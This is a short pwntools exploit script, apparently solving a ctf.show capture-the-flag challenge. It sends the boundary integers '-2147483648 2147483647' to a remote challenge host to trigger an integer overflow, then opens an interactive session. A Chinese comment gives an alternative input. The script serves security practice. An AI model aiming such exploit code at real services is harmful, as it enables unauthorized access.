from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28275)
payload = "-2147483648 2147483647" # 2147483648 2147483647 也可以
io.sendlineafter("Enter two integers: ",payload)
io.interactive()
